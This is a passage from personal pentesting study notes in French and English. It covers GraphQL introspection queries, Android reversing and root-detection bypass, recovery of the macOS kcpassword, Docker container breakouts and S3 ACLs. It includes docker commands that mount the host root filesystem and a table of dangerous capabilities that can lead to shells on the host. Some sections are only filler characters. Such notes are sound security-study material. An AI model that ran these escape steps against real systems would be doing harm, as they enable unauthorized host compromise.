</li>
</ul>
</li>
</ol>
<ul>

<li>Ping sweep :
</li>
</ul>
<p>
<strong>	Scan addresses of a network</strong>
</p>
<p>
<strong>	Example :</strong>
</p>
<p>
<strong>	</strong>
<img src="images/image353.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>auxiliary tcp port scanner :
</li>
</ul>
<p>
<strong>	Port Scanner</strong>
</p>
<p>
<strong>	Example :</strong>
</p>
<p>
<strong>	</strong>
<img src="images/image354.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li>GraphQL
</li>
</ol>
<ul>

<li>Definiton
</li>
</ul>
<p>
<strong>Selon la définition officielle, GraphQL est un langage de requêtes pour API ainsi qu’un environnement pour exécuter ces requêtes.</strong>
</p>
<p>

<img src="images/image355.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Unlike REST APIs (where the client first interacts with arbitrary code written by programmer(s) and this code reaches the database); the client first interacts with GraphQL, which in turn interacts with arbitrary code and ultimately ends talking to the database.</strong>
</p>
<p>

<img src="images/image356.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>This change in the architecture has a lot of advantages tied to it, for example it’s possible to get all the data the client needs in a single request (whereas REST APIs need to perform multiple requests).</strong>
</p>
<ul>

<li>Common GraphQL endpoint :

<li><strong>/graphql/</strong>

<li><strong>/graphql/console/</strong>

<li><strong>/graphql.php</strong>

<li><strong>/graphiql/</strong>

<li><strong>/graphiql.php</strong>
</li>
</ul>
<ul>

<li>GraphQL injection :
</li>
</ul>
<p>
<strong>Cette injection permet de récupérer des infos dans la base de données.</strong>
</p>
<p>
<strong>	Etapes :</strong>
</p>
<ul>

<li><strong>Trouver un endpoints utilisant les GraphQL</strong>

<li><strong>Find the schema ( for mutation et query ) in order to know how to talk to it ( What GraphQL object it interacts with ).</strong>
<p>

        <strong>Useful tools for this :</strong>
</p>
</li>
</ul>
<p>

<img src="images/image357.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Useful Introspection query
</li>
</ul>

<table>
  <tr>
   <td><strong>query{</strong>
<p>
<strong>  __schema{</strong>
<p>
<strong>       types{</strong>
<p>
<strong>         name</strong>
<p>
<strong>       }</strong>
<p>
<strong>  }</strong>
<p>
<strong>}</strong>
   </td>
   <td><strong>Affiché le noms des tables de la base de donnée</strong>
   </td>
  </tr>
  <tr>
   <td><strong>query{</strong>
<p>
<strong>  __type(name: “[NAME_OF_TABLE/TYPE]”){</strong>
<p>
<strong>       fields{</strong>
<p>
<strong>         name</strong>
<p>
<strong>       }</strong>
<p>
<strong>  }</strong>
<p>
<strong>}</strong>
<p>
<strong>“</strong>
   </td>
   <td><strong>Affiche les “colonnes” d’une table de la base de donnée</strong>
<p>
<strong>Autrement dit : Affiche les champs d’un type.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>query{</strong>
<p>
<strong>  __schema{</strong>
<p>
<strong>       queryType{</strong>
<p>
<strong>         fields{</strong>
<p>
<strong>           name</strong>
<p>
<strong>           args{name,defaultValue}</strong>
<p>
<strong>         }</strong>
<p>
<strong>       }</strong>
<p>
<strong>  }</strong>
<p>
<strong>}</strong>
   </td>
   <td><strong>Affiche toutes les opérations autorisés.</strong>
<p>
<strong>Une opération est une forme de requête dont la syntaxe est déjà spécifié.</strong>
<p>
<strong>Toutes les opérations ont un nom.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>query{__schema{mutationType{fields{name,args{name,defaultValue}}}}}</strong>
   </td>
   <td><strong>Affiche toutes les mutations disponibles.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>The introspection query should only be allowed internally and should not be allowed to the general public.</strong>
</p>
<ul>

<li>MISC
</li>
</ul>
<ul>

<li><strong>Try SQLi from GraphQL request.</strong>
</li>
</ul>
<ol>

<li>Bash

<li>MISC
</li>
</ol>
<p>

<img src="images/image358.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Actually, when looking for vulnerabilities in shell code, the first thing to do is look for unquoted variables. It's easy to spot, often a good candidate, generally easy to track back to attacker-controlled data. There's an infinite number of ways an unquoted variable can turn into a vulnerability.</strong>
</li>
</ul>
<p>

<img src="images/image359.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li>Ruby-On-Rails

<li>MISC
</li>
</ol>
<p>

<img src="images/image360.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image361.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image362.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Bad regular expression :
<p>

    
<img src="images/image363.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

    In this code, we can inject CRLF characters to inject commands. We have to replace this characters :
</p>
<p>

     
<img src="images/image364.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
<ul>

<li>
</li>
</ul>
<ol>

<li>PowerShell

<li>Definition
</li>
</ol>
<p>
<strong>PowerShell, ou Windows PowerShell, anciennement Microsoft Command Shell (MSH), est une suite logicielle développée par Microsoft qui intègre une interface en ligne de commande, un langage de script nommé PowerShell ainsi qu’un kit de développement.</strong>
</p>
<p>
<strong>PowerShell est un langage de script fondé sur la programmation orientée objet.</strong>
</p>
<ol>

<li>Others
<p>


<img src="images/image365.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image366.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ol>
<ul>

<li>Recovering saved macOS user passwords
<p>

    <strong>Users who have (inadvisedly) enabled automatic login often forget the password. It is merely encoded with an XOR cipher and stored in/etc/kcpassword.</strong>
</p>
<p>

    <strong>To recover this password :</strong>
</p>
</li>
</ul>
<p>

<img src="images/image367.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Mass assignment
</li>
</ul>
<p>
<strong>L'attribution de masse est une vulnérabilité informatique dans laquelle un modèle d'enregistrement actif dans une application Web est utilisé de manière abusive pour modifier des éléments de données ( ajout de paramètres GET ou POST oubliés ou mal gérés par exemple ).</strong>
</p>
<h3>Tunneling with Chisel :</h3>


<p>

<img src="images/image368.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li>Active Directory
</li>
</ol>
<p>
<strong>qsfsdfqfdsf</strong>
</p>
<p>
<strong>fqsdfqsdf</strong>
</p>
<p>
<strong>sqdfsqfqsdf</strong>
</p>
<ol>

<li>DNS
</li>
</ol>
<h3>Différents Commands</h3>



<table>
  <tr>
   <td>
<img src="images/image369.png" width="" alt="alt_text" title="image_tooltip">

   </td>
   <td>
<ul>

<li><strong>dig MX witrapper.com : retrieve MX record on the DNS SERVER witrapper.com</strong>
<ul>

<li><strong>The second and third command are the same.</strong>
<ul>

<li><strong>PTR is a reverse lookup ( IP => domain name )</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image370.png" width="" alt="alt_text" title="image_tooltip">

   </td>
   <td>
<ul>

<li><strong>dig @&lt;nameserver> &lt;domain name> :</strong>
    <strong>Search information about the &lt;domain name> in the DNS server &lt;nameserver></strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image371.png" width="" alt="alt_text" title="image_tooltip">

   </td>
   <td><strong>alternative to dig.</strong>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image372.png" width="" alt="alt_text" title="image_tooltip">

   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td><strong>Dnsenum &lt;dnsServ></strong>
<p>

<img src="images/image373.png" width="" alt="alt_text" title="image_tooltip">

   </td>
   <td>
<ul>

<li><strong>Obtenez l'adresse de l'hôte (enregistrement A).</strong>
<ul>

<li><strong>Obtenez les nameservers.</strong>
<ul>

<li><strong>Obtenez l'enregistrement MX (fileté).</strong>
<ul>

<li><strong>Exécutez des requêtes axfr sur les serveurs de noms et obtenez BIND VERSION (threaded).</strong>
<ul>

<li><strong>Obtenez des noms et sous-domaines supplémentaires via google scraping</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>

<img src="images/image374.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>DNSSEC
</li>
</ul>
<p>

<img src="images/image375.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>MISC
<ul>

<li><strong>You can check the PTR records ( Reverse add ) to find some Vhosts of a site web ( multiple domaine in one server web, in one IP adr )</strong>
</li>
</ul>
</li>
</ul>
<ol>

<li>Android
</li>
</ol>
<h3>Tools</h3>



<table>
  <tr>
   <td><strong>apktool</strong>
   </td>
   <td><strong>Tool for reverse</strong>
   </td>
  </tr>
  <tr>
   <td><strong>apktool d [FILE.APK]</strong>
<p>
<strong>apktool b [PREVIOUS OUTPUT]</strong>
   </td>
   <td><strong>decode the apk => smali</strong>
<p>
<strong>compile the ALL Smali folder</strong>
   </td>
  </tr>
  <tr>
   <td><strong>jad ( mauvais decompiler )</strong>
   </td>
   <td><strong>Java decompiler ( .class => .java )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>d2j-dex2jar [FILE.DEX]</strong>
   </td>
   <td><strong>.dex (Dalvik byte code,  dex is files in APK) => .jar</strong>
   </td>
  </tr>
  <tr>
   <td><strong>http://www.javadecompilers.com</strong>
   </td>
   <td><strong>Java decompiler ( .class => .java )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>jadx -d [OUTPUT_FOLDER] [APK_FILE]</strong>
   </td>
   <td><strong>Direct Java decompiler ( DEX => .JAVA )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Proguard</strong>
   </td>
   <td><strong>For Obfuscation</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Decompile APK
<p>

    <strong>Here 2 solutions for decompile :</strong>
</p>
<ol>

<li><strong>APK ( .dex ) => SMALI ( readable code )</strong>

<li><strong>APK ( .dex ) => JAR -> .class => java code</strong>
</li>
</ol>
</li>
</ul>
<p>
<strong>When you create an application code, the apk file contains a .dex file, which contains binary Dalvik bytecode. This is the format that the platform actually understands.</strong>
</p>
<p>
<strong>However, it's not easy to read or modify binary code, so there are tools out there to convert to and from a human readable representation. The most common human readable format is known as Smali.</strong>
</p>
<ul>

<li>AndroidManifest.xml :
</li>
</ul>
<p>
<strong>Le fichier AndroidManifest.xml, qui se trouve à la racine de tout projet Android, est en quelque sorte une description complète de l’application (composantes, activités, services, permissions, fournisseurs de contenu, etc.).</strong>
</p>
<p>
<strong>for more information : <a href="https://developer.android.com/guide/topics/manifest/manifest-intro">https://developer.android.com/guide/topics/manifest/manifest-intro</a></strong>
</p>
<p>
<strong>En informatique, un fichier JAR (Java archive) est un fichier ZIP utilisé pour distribuer un ensemble de classes Java. Ce format est utilisé pour stocker les définitions des classes, ainsi que des métadonnées. On peut utiliser “unzip” dessus pour retrouver des fichier .class.</strong>
</p>
<ul>

<li>Root détection :
</li>
</ul>
<p>
<strong>Nowadays many applications such as financial, banking, payment wallet applications do not work on the rooted device. Pentesting requires root permission to install various tools to compromise the security of the application and it is a very painful job for any pentester if the app does not work on the rooted device that restricts the tester from performing various test cases.</strong>
</p>
<ul>

<li>Bypass root detection :
</li>
</ul>
<p>

<img src="images/image376.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Android Activity lifecycle :
</li>
</ul>
<p>
<strong>	</strong>
</p>
<p>

<img src="images/image377.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Rooting and Jailbreaking : 
<p>

    <strong>These terms refer to gaining administrator authorizations in your device</strong>
</p>
</li>
</ul>
<ul>

<li><strong>Here the differences between using java itself and java for android :</strong>
</li>
</ul>
<p>

<img src="images/image378.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Signing mobile application :
</li>
</ul>
<p>
<strong>In general, the recommended strategy for all developers is to sign all of your applications with the same certificate. There are several reasons why you should do so :</strong>
</p>
<p>
<strong>Application upgrade – As you release updates to your application, you must continue to sign the updates with the same certificate or set of certificates, if you want users to be able to upgrade seamlessly to the new version. When the system is installing an update to an application, it compares the certificate(s) in the new version with those in the existing version. If the certificates match exactly, including both the certificate data and order, then the system allows the update.</strong>
</p>
<p>
<strong>Application modularity – The Android system allows applications that are signed by the same certificate to run in the same process, if the applications so requests, so that the system treats them as a single application. In this way you can deploy your application in modules, and users can update each of the modules independently if needed.</strong>
</p>
<p>
<strong>Code/data sharing through permissions – The Android system provides signature-based permissions enforcement, so that an application can expose functionality to another application that is signed with a specified certificate. By signing multiple applications with the same certificate and using signature-based permissions checks, your applications can share code and data in a secure manner.</strong>
</p>
<h3>
    MISC</h3>


<ul>

<li><strong>En faisant du debugging ( exemple avec ADB ), on peut lancer et contrôler n’importe quelle Activity d’une application sur Android.</strong>
</li>
</ul>
<ul>

<li><strong>Unlike programming paradigms in which apps are launched with a main() method, the Android system initiates code in an Activity instance by invoking specific callback methods that correspond to specific stages of its lifecycle.</strong>
<p>

    <strong>The mobile-app experience differs from its desktop counterpart in that a user's interaction with the app doesn't always begin in the same place. For instance, if you open an email app from your home screen, you might see a list of emails.</strong>
</p>
<p>

    <strong>By contrast, if you are using a social media app that then launches your email app, you might go directly to the email app's screen for composing an email.</strong>
</p>
</li>
</ul>
<ol>

<li>IOS
<h3>
        Tools</h3>



<table>
  <tr>
   <td>
<strong>Cycript</strong>
</li>
</ol>
   </td>
   <td><strong>Allows developers to explore and modify running applications on either iOS or Mac OS X </strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>MISC
</li>
</ul>
<p>
<strong>There are really just two languages used for iOS development. The primary languages that dominate are Objective-C and Swift. Of course, you can use all kinds of different languages to code iOS apps.</strong>
</p>
<p>
<strong>.ipa est un fichier d'archives qui stocke une application iOS. Chaque fichier .ipa comprend un binaire et ne peut être installé que sur un appareil Mac OS basé sur iOS ou ARM. Les fichiers portant l'extension peuvent être changés par l'extension en .zip et en les décompressant et pour accéder plus facilement aux fichiers à l'intérieur.</strong>
</p>
<ol>

<li>Reverse
</li>
</ol>
<ul>

<li>Techniques d’anti-reverse :
<ol>

<li>Polymorphisme et métamorphisme
<p>

    <strong>Les codes malveillants se réécrivent automatiquement à chaque réplication pour que la signature du malware soit modifiée, on parle de polymorphisme.</strong>
</p>
<p>

    <strong>Le métamorphisme est une technique qui automatise un polymorphisme afin que chaque propagation d’un malware entraîne une réécriture automatique du malware. </strong>
</p>
<p>

    <strong>Elle peut par exemple prendre la forme d’une addition de NOP, de la permutation de registres, de l’addition d’instructions ou boucles inutiles, du réordonnancement des fonctions, de la modification du flux du programme… </strong>
</p>
<ol>

<li>Packer
</li>
</ol>
</li>
</ol>
</li>
</ul>
<p>
<strong>	Les packers sont des programmes qui permettent de cacher les</strong>
</p>
<p>

    <strong>malwares aux antivirus, de compliquer l’analyse et de réduire la taille des exécutables.</strong>
</p>
<p>

    <strong>Les packers permettent notamment de rendre l’analyse statique inutile, à moins de réussir à les contourner.</strong>
</p>
<p>

    <strong>Le principe de fonctionnement des packers est de transformer un exécutable en un autre plus petit, qui va contenir l’ancien exécutable sous forme de données, ainsi qu’un système d’unpacking appelé par le système d’exploitation.</strong>
</p>
<p>

    <strong>Pour contrer un packer il est nécessaire de réaliser l’opération inverse à celle qui a été réalisée.</strong>
</p>
<p>


<img src="images/image379.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li>Anti-virtualisation et anti-émulation
<p>

    <strong>L’analyse de codes malveillants nécessite un environnement contrôlé. Beaucoup d’analystes vont donc choisir d’utiliser des machines virtuelles, présentant de plus l’avantage de pouvoir revenir facilement à un état enregistré. C’est pourquoi les créateurs de malwares ont commencé à y implémenter des éléments anti-machines virtuels (anti-VM) ( notamment en exploitant des informations divulguées par les Hyperviseurs ) .</strong>
</p>
</li>
</ol>
<ol>

<li>Container Security
</li>
</ol>
<p>
<strong><a href="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html</a></strong>
</p>
<ul>

<li>Definition
</li>
</ul>
<p>
<strong>Ce sont des environnements Linux isolés. </strong>
</p>
<p>
<strong>Un conteneur virtualise le système de fichier.</strong>
</p>
<p>
<strong>By default, containers are run as root. dockerd (the docker daemon) runs as root, and this is normal. root is needed to configure certain container aspects needed to function correctly. There may be ways of running without root, but it’s fine as it is.</strong>
</p>
<p>
<strong>Le problème majeur, souvent négligé dans l’engouement qui prévaut aujourd’hui pour les conteneurs, est celui de la sécurité car il partage de ressource avec l’hôte et de se fait des privilege trop élevé peut compromettre l'hôte. </strong>
<img src="images/image380.png" width="" alt="alt_text" title="image_tooltip">

<img src="images/image381.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>
                Some Commands</h3>



<table>
  <tr>
   <td><strong>docker image ls</strong>
   </td>
   <td><strong>check for containers enabled in the machine</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker run -v /root/:/mnt -t [DOCK_IMAGE]</strong>
   </td>
   <td><strong>Mount a container with the DOCK_IMAGE and it will make the root files accessible inside the /mnt.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker version</strong>
   </td>
   <td><strong>print docker version</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker host</strong>
   </td>
   <td><strong>Check host Information</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker pull</strong>
   </td>
   <td><strong>Pull an image or a repository from a registry</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker run -dt [IMAGE]</strong>
   </td>
   <td><strong> Run image in background mode</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker run -it [IMAGE]</strong>
   </td>
   <td><strong> Run image in interactive mode</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker ps</strong>
   </td>
   <td><strong>List running containers</strong>
   </td>
  </tr>
  <tr>
   <td><strong> docker inspect [CONTAINER_ID]</strong>
   </td>
   <td><strong>Inspect a container</strong>
   </td>
  </tr>
  <tr>
   <td><strong> docker container</strong>
   </td>
   <td><strong>Manage containers</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker image</strong>
   </td>
   <td><strong>Manage image</strong>
   </td>
  </tr>
  <tr>
   <td><strong> docker network</strong>
   </td>
   <td><strong>Manage docker networks</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker attack [CONTAINER_ID]</strong>
   </td>
   <td><strong>enter in Interact mode to the container</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker exec -it [CONT_ID] /bin/sh</strong>
   </td>
   <td><strong>Execute a command in a running container</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker stop [CONT_ID]</strong>
   </td>
   <td><strong>Stop a container</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker start [CONT_ID]</strong>
   </td>
   <td><strong>Start a stopped container</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker kill [CONT_ID]</strong>
   </td>
   <td><strong>Kill a running container</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker rmi -f [IMAGE]</strong>
   </td>
   <td><strong>Remove image by name or ID</strong>
   </td>
  </tr>
  <tr>
   <td><strong>docker run -it -v /:/host/ ubuntu:18.04 bash</strong>
   </td>
   <td><strong>Start an Ubuntu container. Mount root directory of host machine on /host directory of the</strong>
<p>
<strong>container</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Registre Docker
<p>


<img src="images/image382.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Docker Compose
<p>


<img src="images/image383.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Dockerfile
<p>


<img src="images/image384.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>

<strong>In the scenario where a container has an Ip address 172.17.0.2, the host machine mostly creates an interface which acts as gateway for Docker network. And, generally the first IP address of the range is used for that i.e. 172.17.0.1 in this case.</strong>
</p>
<p>

<strong>172.17.0.1 is the IP address of the host in the Docker network.</strong>
</p>
<h3>
Container Breakouts :</h3>


<p>

<strong>By default, the Docker containers run with limited capabilities. Therefore to perform a privileged operation (like updating time, debugging process etc) the container requires additional capabilities. And, most of the time instead of defining the specific capabilities, people just run the container in the privileged mode which can lead to compromise of the underlying host machine using additional capabilities like CAP_SYS_ADMIN.</strong>
</p>
<p>
<strong> capsh --print => Check the capabilities provided in a docker container</strong>
</p>
<p>
<strong>Dangerous capabilities on container</strong>
</p>

<table>
  <tr>
   <td><strong>SYS_ADMIN</strong>
   </td>
   <td><strong>leveraged by mounting the root file system ( and then read all host file system )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SYS_PTRACE</strong>
   </td>
   <td><strong>Allow process debugging.</strong>
<p>
<strong>Leveraged by injecting a bind shell into a host machine process. ( you can do “everything” when you debug a process ).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SYS_MODULE </strong>
   </td>
   <td><strong>The container can insert/remove kernel modules in/from the kernel of the host machine.</strong>
<p>
<strong>For example, an attacker invokes a reverse shell with the help of usermode Helper API (used to create user mode processes from kernel space) :</strong>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td><strong>docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: SecurityOpt={{ .HostConfig.SecurityOpt }}'</strong>
   </td>
   <td><strong>This returns either &lt;no value> or your modified seccomp profile. If it returns [seccomp:unconfined], the container is running without any seccomp profiles and is therefore not configured in line with good security practices.</strong>
   </td>
  </tr>
  <tr>
   <td>DAC_READ_SEARCH
   </td>
   <td>bypass file read permission checks and directory read and execute permission checks.
<p>
Using any mounted file in a container, it's possible to get access on files in the host system.
   </td>
  </tr>
  <tr>
   <td>DAC_OVERRIDE
   </td>
   <td>allows a container to bypass file read, write, and execute permission checks.
<p>
Combined with DAC_READ_SEARCH capability, it can be exploited to escape a container using a famous exploit named Shocker.
   </td>
  </tr>
</table>


<ul>

<li>Misc
<p>

<strong>- To enable services running inside the container to communicate with Docker daemon, it's a very common practice to mount the Docker UNIX socket inside the container. However, every time you have access to the Docker Socket (default location: /var/run/docker.sock) it means that you are root on the host.</strong>
</p>
<p>

<strong>Docker CLI uses two main channels to communicate with the Docker daemon ( server ):  - UNIX socket for local management (/var/run/docker.sock)</strong>
</p>
<p>

<strong>- TCP/SSL for remote management. AS soon as the daemon is running by the root</strong>
</p>
<p>


<img src="images/image385.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<strong>Namespaces provide the first and most straightforward form of isolation: processes running within a container cannot see, and even less affect, processes running in another container, or in the host system.</strong>
</p>
<p>

<strong>There are multiple administrative tools available today which helps developers and operation teams in managing Docker hosts/swarms. Such tools require high privileges to perform various operations (e.g. starting a container with special capabilities, attaching to any container etc.).  However, if they are not protected well, they can lead to compromise the entire system.</strong>
</p>
<p>

<strong>La plupart des capability nécessitent d’avoir un accès root sur le conteneur pour être exploité. Ceci ajoute une étape supplémentaire à l’attaquant.</strong>
</p>
<p>

<strong>Conventionally Docker daemon is configured to listen on port 2375 for API requests sent over unencrypted connections. Whereas 2376 is used for encrypted connections.</strong>
</p>
<p>

<strong>Seccomp is essentially a mechanism to restrict system calls that a process may make, so the same way one might block packets coming from some IPs, one can also block processes from sending system calls to the CPU. When you run a container, it uses the default profile seccomp unless you override it with the --security-opt options.</strong>
</p>
</li>
</ul>
<p>

<strong>A single manifest is information about an image, such as layers, size, and digest. The docker manifest command also gives users additional information such as the os and architecture an image was built for.</strong>
</p>
<p>

<strong>Basically, a layer, or image layer is a change on an image, or an intermediate image. Every command you specify (FROM, RUN, COPY, etc.) in your Dockerfile causes the previous image to change, thus creating a new layer.</strong>
</p>
<ol>

<li>S3 (Simple Storage Service) AWS (Amazon Web Services)
</li>
</ol>
<ul>

<li>Définition
</li>
</ul>
<p>
<strong>The Amazon Web Services (AWS) Simple Storage Service (S3) is a common cloud-based storage service frequently used by developers.</strong>
</p>
<ul>

<li>S3 Buckets
</li>
</ul>
<p>
<strong>S3 buckets : AWS's name of choice for the storage vessel ( “cuve de stockage” ).  </strong>
</p>
<p>
<strong>S3 vulnerability can occur due to misconfiguration, leading to disclosure of sensitive information.</strong>
</p>
<p>
<strong>Buckets and objects are S3 resources. By default, only the resource owner can access these resources. The resource owner refers to the AWS account that creates the resource. Access policy ( Bucket policies, ACLs, …) describes who has access to what.</strong>
</p>
<p>
<strong>Accordingly, you can categorize the available S3 access policies as Resource-based policies or User Policies.</strong>
</p>
<ul>

<li>ACL ( Access control list )
</li>
</ul>
<p>
<strong>ACLs are used to grant basic read/write permissions to other AWS accounts. Each bucket and object has an ACL associated with it.</strong>
</p>
<p>

<img src="images/image386.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>S3 supports a set of predefined grants, known as canned ACLs</strong>
</p>
<p>

<img src="images/image387.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image388.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image389.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image390.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li>Smart Contract
</li>
</ol>
<p>
<strong>gggggggggggggg</strong>
</p>
<p>
<strong>gfgdfgdfgdfgdfg</strong>
</p>
<ol>

<li>Windows in general
</li>
</ol>
<h3>Commands</h3>



<table>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>NT hash
<p>

            <strong>Windows NT hashes passwords before storing them in the SAM database. ... Each unique password produces an unpredictable hash. When a user logs on and enters a password, NT hashes the candidate password and compares it to the user's official hash in the SAM. If the hashes match, NT authenticates the user.</strong>
</p>
<ul>

<li>Hiberfill.sys file
<p>

            <strong>Sur Windows, il y a plusieurs moyens d’économiser de l’énergie avec votre PC. Vous pouvez tout simplement l’éteindre ou bien le mettre en veille ou encore en veille prolongée.</strong>
</p>
<p>

            <strong>Et bien c’est justement cette veille prolongée qui va avoir besoin du fichier hiberfil.sys. Dans ce fichier sera recopiée la totalité de votre mémoire vive sur votre disque système.</strong>
</p>
<p>

            <strong>Alors oui, plus vous avez de mémoire vive, plus ce fichier sera volumineux.</strong>
</p>
<p>

            <strong>Ce fichier est compressé ( de différente manière selon le système ). Avant de l’utiliser sur Volatility, il faut le décompresser.</strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li>DLL Hijacking definiton
</li>
</ul>
<p>
<strong>A DLL or a Dynamic Link Library is a library that contains code and data that can be used by more than one program at the same time.</strong>
</p>
<p>
<strong>Much of the operating system and application functionality resides in the DLLs. You can identify missing DLL paths used by applications, and perform DLL Hijacking to escalate privileges.</strong>
</p>
<h3>DLL Hijacking techniques</h3>



<table>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>UAC Bypass definiton
</li>
</ul>
<p>
<strong>User Account Control or UAC is a security feature of Microsoft Windows. It enforces mandatory access control to prevent unauthorized changes to the operating system. For a user application to make any changes, administrator authorization is required. UAC prevents malware and other malicious programs from compromising the operating system.</strong>
</p>
<p>
<strong>UAC permet de définir pour chaque programme qui est lancé un niveau de privilèges indépendant des droits possédés par l'utilisateur actif.</strong>
</p>
<p>
